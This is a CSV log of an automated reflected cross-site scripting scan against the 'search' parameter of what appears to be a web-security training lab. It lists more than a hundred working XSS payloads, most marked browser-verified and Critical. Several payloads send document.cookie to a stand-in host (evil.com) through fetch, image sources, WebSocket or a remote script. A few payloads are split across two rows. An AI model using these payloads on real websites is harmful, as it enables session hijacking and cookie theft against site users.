Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 14:22:37.118,2026-01-10 14:22:37.292,0.175,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg><discard onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:37.292,2026-01-10 14:22:37.463,0.171,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<math><maction actiontype=toggle onclick=alert(1)>X</maction></math>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:37.463,2026-01-10 14:22:37.759,0.295,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<iframe srcdoc=""<img src=x onerror=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:37.759,2026-01-10 14:22:38.079,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<iframe srcdoc=""<script>alert(1)</script>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:38.079,2026-01-10 14:22:38.247,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<iframe srcdoc=""<svg onload=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:38.247,2026-01-10 14:22:38.417,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img name=alert src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:38.417,2026-01-10 14:22:38.592,0.175,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<form name=alert><input type=submit onclick=alert(1)></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:38.592,2026-01-10 14:22:38.759,0.167,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:38.759,2026-01-10 14:22:39.047,0.288,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>fetch('http://evil.com?c='+document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:39.047,2026-01-10 14:22:39.358,0.311,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onerror=this.src='http://evil.com?c='+document.cookie>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:39.358,2026-01-10 14:22:39.558,0.199,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg onload=fetch('http://evil.com?c='+document.cookie)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:39.558,2026-01-10 14:22:39.824,0.266,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>document.body.innerHTML+=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:39.824,2026-01-10 14:22:40.003,0.179,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:40.003,2026-01-10 14:22:40.169,0.166,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<body/onhashchange=alert(1)><a href=#x>clickme</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:40.169,2026-01-10 14:22:40.336,0.167,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<body/onpopstate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:40.336,2026-01-10 14:22:40.639,0.303,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<body/onpageshow=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:40.639,2026-01-10 14:22:40.815,0.176,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<body/onpagehide=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:40.815,2026-01-10 14:22:40.987,0.173,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<body/onstorage=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:40.987,2026-01-10 14:22:41.277,0.290,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>new WebSocket('ws://evil.com').onopen=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:41.277,2026-01-10 14:22:41.480,0.203,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script><![CDATA[alert(1)]]></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:41.480,2026-01-10 14:22:41.758,0.278,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<?xml version=""1.0""?><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:41.759,2026-01-10 14:22:42.079,0.321,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<?xml-stylesheet type=""text/xsl"" href=""javascript:alert(1)""?>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:42.079,2026-01-10 14:22:42.395,0.316,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,﻿<script>alert(1)</script>,NO_REFLECTION,No,,Info
2026-01-10 14:22:42.395,2026-01-10 14:22:42.719,0.324,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<source src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:42.719,2026-01-10 14:22:43.038,0.319,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<track src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:43.038,2026-01-10 14:22:43.206,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:43.206,2026-01-10 14:22:43.519,0.313,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<use href=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:43.519,2026-01-10 14:22:43.840,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input autofocus onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:43.840,2026-01-10 14:22:44.007,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<textarea autofocus onfocus=alert(1)></textarea>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:44.007,2026-01-10 14:22:44.320,0.312,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<select autofocus onfocus=alert(1)></select>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:44.320,2026-01-10 14:22:44.558,0.238,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<button autofocus onfocus=alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:44.558,2026-01-10 14:22:44.754,0.196,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<div onpointerdown=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:44.754,2026-01-10 14:22:44.957,0.203,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<div onpointerup=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:44.957,2026-01-10 14:22:45.125,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<div onpointerover=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:45.125,2026-01-10 14:22:45.384,0.259,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<div onpointerenter=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:45.384,2026-01-10 14:22:45.557,0.172,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<div onpointerleave=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:45.557,2026-01-10 14:22:45.733,0.176,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<div onpointermove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:45.733,2026-01-10 14:22:45.938,0.206,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<div ontouchstart=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:45.938,2026-01-10 14:22:46.107,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<div ontouchend=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:46.107,2026-01-10 14:22:46.275,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<div ontouchmove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:46.275,2026-01-10 14:22:46.448,0.172,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<div style=""animation:spin 1s"" onanimationstart=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:46.448,2026-01-10 14:22:46.618,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<div style=""animation:spin 1s"" onanimationend=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:46.618,2026-01-10 14:22:46.878,0.261,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<div style=""animation:spin 1s"" onanimationiteration=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:46.878,2026-01-10 14:22:47.090,0.211,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<div style=""transition:all 1s"" ontransitionend=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:47.090,2026-01-10 14:22:47.359,0.269,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<div data-x=x onclick=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:47.359,2026-01-10 14:22:47.679,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input accesskey=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:47.679,2026-01-10 14:22:47.853,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<div contenteditable oninput=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:47.853,2026-01-10 14:22:48.158,0.305,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<input type=hidden onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:48.158,2026-01-10 14:22:48.477,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<select><option oninput=alert(1)>X</option></select>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:48.477,2026-01-10 14:22:48.687,0.210,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<img/src=""x""/onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:48.687,2026-01-10 14:22:48.856,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img%20src=x%20onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:48.856,2026-01-10 14:22:49.028,0.171,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:49.028,2026-01-10 14:22:49.234,0.206,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script	>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:49.234,2026-01-10 14:22:49.404,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script,ESCAPED,No,,Low
2026-01-10 14:22:49.404,2026-01-10 14:22:49.578,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:49.578,2026-01-10 14:22:49.744,0.166,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script,ESCAPED,No,,Low
2026-01-10 14:22:49.744,2026-01-10 14:22:49.905,0.161,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:49.905,2026-01-10 14:22:50.082,0.177,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg/onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:50.082,2026-01-10 14:22:50.399,0.317,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg/onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:50.399,2026-01-10 14:22:50.719,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg/onload=print()>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:50.719,2026-01-10 14:22:50.889,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<marquee onstart=prompt(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:50.889,2026-01-10 14:22:51.057,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<marquee onstart=confirm(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:51.057,2026-01-10 14:22:51.358,0.301,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<iframe/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:51.358,2026-01-10 14:22:51.679,0.321,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:51.679,2026-01-10 14:22:51.848,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<iframe%20src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:51.848,2026-01-10 14:22:52.159,0.311,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<object/data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:52.159,2026-01-10 14:22:52.479,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:52.479,2026-01-10 14:22:52.647,0.167,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<embed/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:52.647,2026-01-10 14:22:52.958,0.312,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<embed src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:52.958,2026-01-10 14:22:53.279,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<var onmouseover=alert(1)>X</var>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:53.279,2026-01-10 14:22:53.599,0.321,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<code onmouseover=alert(1)>X</code>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:53.599,2026-01-10 14:22:53.772,0.173,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<span onmouseover=alert(1)>X</span>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:53.772,2026-01-10 14:22:53.935,0.163,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<p onmouseover=alert(1)>X</p>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:53.935,2026-01-10 14:22:54.110,0.175,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<h1 onmouseover=alert(1)>X</h1>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:54.110,2026-01-10 14:22:54.411,0.301,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<h2 onmouseover=alert(1)>X</h2>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:54.411,2026-01-10 14:22:54.584,0.173,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<pre onmouseover=alert(1)>X</pre>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:54.584,2026-01-10 14:22:54.788,0.204,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<blockquote onmouseover=alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:54.788,2026-01-10 14:22:55.037,0.249,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<ol onmouseover=alert(1)><li>X</li></ol>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:55.037,2026-01-10 14:22:55.206,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<ul onmouseover=alert(1)><li>X</li></ul>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:55.206,2026-01-10 14:22:55.525,0.318,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<li onmouseover=alert(1)>X</li>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:55.525,2026-01-10 14:22:55.837,0.312,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<dl onmouseover=alert(1)><dt>X</dt></dl>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:55.837,2026-01-10 14:22:56.008,0.171,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<dt onmouseover=alert(1)>X</dt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:56.008,2026-01-10 14:22:56.183,0.175,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<dd onmouseover=alert(1)>X</dd>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:56.183,2026-01-10 14:22:56.485,0.302,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<fieldset onmouseover=alert(1)>X</fieldset>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:56.485,2026-01-10 14:22:56.802,0.316,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<legend onmouseover=alert(1)>X</legend>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:56.802,2026-01-10 14:22:57.025,0.224,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<label onmouseover=alert(1)>X</label>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:57.025,2026-01-10 14:22:57.279,0.253,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<table><caption onmouseover=alert(1)>X</caption></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:57.279,2026-01-10 14:22:57.599,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<table><colgroup onmouseover=alert(1)></colgroup></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:57.599,2026-01-10 14:22:57.918,0.319,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<table><col onmouseover=alert(1)></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:57.918,2026-01-10 14:22:58.238,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<table><thead onmouseover=alert(1)></thead></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:58.238,2026-01-10 14:22:58.558,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<table><tbody onmouseover=alert(1)></tbody></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:58.558,2026-01-10 14:22:58.733,0.175,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<table><tfoot onmouseover=alert(1)></tfoot></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:58.733,2026-01-10 14:22:59.038,0.305,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<table><tr onmouseover=alert(1)></tr></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:59.038,2026-01-10 14:22:59.227,0.189,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<table><th onmouseover=alert(1)>X</th></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:59.227,2026-01-10 14:22:59.517,0.290,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<table><td onmouseover=alert(1)>X</td></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:59.517,2026-01-10 14:22:59.688,0.171,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<meter onmouseover=alert(1)>X</meter>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:59.688,2026-01-10 14:22:59.999,0.310,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<progress onmouseover=alert(1)>X</progress>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:59.999,2026-01-10 14:23:00.173,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<output onmouseover=alert(1)>X</output>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:00.173,2026-01-10 14:23:00.479,0.306,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<time onmouseover=alert(1)>X</time>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:00.479,2026-01-10 14:23:00.800,0.321,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<mark onmouseover=alert(1)>X</mark>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:00.800,2026-01-10 14:23:00.968,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<ruby onmouseover=alert(1)>X</ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:00.968,2026-01-10 14:23:01.280,0.311,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<ruby><rt onmouseover=alert(1)>X</rt></ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:01.280,2026-01-10 14:23:01.599,0.319,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<ruby><rp onmouseover=alert(1)>X</rp></ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:01.599,2026-01-10 14:23:01.775,0.176,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<bdi onmouseover=alert(1)>X</bdi>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:01.775,2026-01-10 14:23:02.079,0.304,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<bdo onmouseover=alert(1)>X</bdo>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:02.079,2026-01-10 14:23:02.399,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<wbr onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:02.399,2026-01-10 14:23:02.573,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<ins onmouseover=alert(1)>X</ins>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:02.573,2026-01-10 14:23:02.879,0.306,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<del onmouseover=alert(1)>X</del>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:02.879,2026-01-10 14:23:03.199,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<small onmouseover=alert(1)>X</small>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:03.199,2026-01-10 14:23:03.373,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<strong onmouseover=alert(1)>X</strong>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:03.373,2026-01-10 14:23:03.679,0.306,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<em onmouseover=alert(1)>X</em>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:03.679,2026-01-10 14:23:03.848,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<b onmouseover=alert(1)>X</b>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:03.848,2026-01-10 14:23:04.159,0.312,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<i onmouseover=alert(1)>X</i>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:04.159,2026-01-10 14:23:04.329,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<u onmouseover=alert(1)>X</u>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:04.329,2026-01-10 14:23:04.498,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<s onmouseover=alert(1)>X</s>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:04.498,2026-01-10 14:23:04.698,0.201,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<sub onmouseover=alert(1)>X</sub>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:04.698,2026-01-10 14:23:04.958,0.260,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<sup onmouseover=alert(1)>X</sup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:04.958,2026-01-10 14:23:05.279,0.321,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<abbr onmouseover=alert(1)>X</abbr>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:05.279,2026-01-10 14:23:05.448,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<address onmouseover=alert(1)>X</address>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:05.448,2026-01-10 14:23:05.758,0.310,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<article onmouseover=alert(1)>X</article>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:05.758,2026-01-10 14:23:06.080,0.321,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<aside onmouseover=alert(1)>X</aside>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:06.080,2026-01-10 14:23:06.399,0.319,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<footer onmouseover=alert(1)>X</footer>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:06.399,2026-01-10 14:23:06.565,0.166,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<header onmouseover=alert(1)>X</header>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:06.565,2026-01-10 14:23:06.879,0.314,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<hgroup onmouseover=alert(1)>X</hgroup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:06.879,2026-01-10 14:23:07.048,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<nav onmouseover=alert(1)>X</nav>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:07.048,2026-01-10 14:23:07.220,0.172,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<section onmouseover=alert(1)>X</section>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:23:07.220,2026-01-10 14:23:07.414,0.194,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<main onmouseover=alert(1)>X</main>,RAW_REFLECTION,Yes,alert,Critical
